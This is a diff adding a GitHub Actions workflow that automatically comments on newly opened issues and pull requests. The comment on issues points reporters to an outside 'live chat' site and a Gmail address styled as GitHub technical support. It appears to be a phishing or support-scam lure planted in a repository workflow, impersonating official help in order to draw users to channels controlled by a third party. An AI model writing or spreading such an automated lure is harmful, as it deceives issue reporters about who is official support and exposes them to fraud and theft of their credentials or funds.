@@ -1,0 +1,33 @@
+name: Comment on Every New Issue and PR
+
+permissions:
+  issues: write
+  pull-requests: write
+
+on:
+  issues:
+    types: [opened]
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Comment on Issue or PR
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            const isIssue = !!context.payload.issue;
+            const number = isIssue ? context.payload.issue.number : context.payload.pull_request.number;
+            const type = isIssue ? "issue" : "pull request";
+            const message = isIssue
+              ? "For quick review and assistance, contact the hub agent on the live chat page to report your issue via [Live chat page](https://githelp-connect.web.app). Alternatively send an e-mail to report this via GitHub.interact@gmail.com to ensure total review with the technical support."
+              : "🎉 Thanks for opening a pull request! We're excited to review your contribution.";
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: number,
+              body: message + "\n\nTeam🚀"
+            });
